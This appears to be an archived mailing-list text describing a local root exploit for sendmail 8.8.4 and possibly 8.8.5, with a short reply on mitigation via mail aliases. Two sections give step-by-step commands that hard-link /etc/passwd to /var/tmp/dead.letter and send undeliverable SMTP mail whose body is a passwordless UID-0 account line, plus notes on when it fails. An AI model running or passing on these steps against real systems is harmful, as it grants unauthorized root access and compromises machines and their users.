Try this:
Make hard link of /etc/passwd to /var/tmp/dead.letter
Telnet to port 25, send mail from some bad email address to some unreacheable hoost.
Watch your message get appended to passwd.
ie:
cowzilla::0:0:c0wz1ll4 0wns u:/:/bin/sh

This is not good.  Worked with my 8.8.4, will probably also work with 8.8.5

Root for the whole family

==================================================================

okay, just want to point out some things about this exploit...
this won't work on big boxes that are partitioned cause you can only do a
hard link on the same file system.  another point is that any box that has
a 'MAILER-DAEMON' defined will get any mail that gets sent there instead of it
saving it to /var/tmp/dead.letter, ie, make an /etc/aliases file that defines
a MAILER-DAEMON. for instance, i add these two to my /etc/aliases:

MAILER-DAEMON:gonzo
postmaster:gonzo

then you just type 'newaliases' and you're good to go. (postmaster is a
general good idea) course then you have to deal with ppl's messed up mail...


===================================================================

Here's a nice little sendmail exploit that works with 8.8.4 and maybe with
8.8.5.
You need to have an account on the system you're exploiting.
telnet to your shell and issue following commands:

ln /etc/passwd /var/tmp/dead.letter
telnet target.host 25
mail from: non@existent.host
rcpt to: non@existent.host
data
kRad::0:0:J0oR dEaD:/root:/bin/bash
.
quit

The body of the message will be written into /etc/passwd and you've got a
password-free root account.

Note that this will NOT work under any of the following circumstances:

1. /var and / are different partitions.
	You can't make a hardlink between different partitions.
2. There is a postmaster account or mail alias.
	Mail problems are sent to postmaster before they go to
	/var/tmp/dead.letter.	
3. /var/tmp doesn't exist or isn't publicly writable.
	Duh.
4. Other situations?
